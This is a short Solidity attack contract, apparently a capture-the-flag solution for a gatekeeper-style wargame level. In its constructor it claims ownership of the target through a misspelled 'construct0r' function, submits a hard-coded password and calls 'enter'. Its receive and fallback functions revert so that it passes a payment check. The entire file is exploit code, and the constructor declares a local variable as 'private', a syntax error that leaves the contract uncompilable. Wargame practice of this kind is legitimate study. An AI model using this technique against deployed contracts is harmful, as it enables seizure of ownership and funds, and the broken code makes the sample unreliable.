pragma solidity ^0.8.0;

interface IGt {
    function construct0r() external;
    function getAllowance(uint256) external;
    function enter() external;
}

contract Attack4 {
    constructor (address payable _target) {
        IGt private instance = IGt(_target);
        instance.construct0r();
        uint256 password = 1751543238;
        instance.getAllowance(password);
        instance.enter();
    }

    receive() external payable {
        revert();
    }

    fallback() external payable {
        revert();
    }
}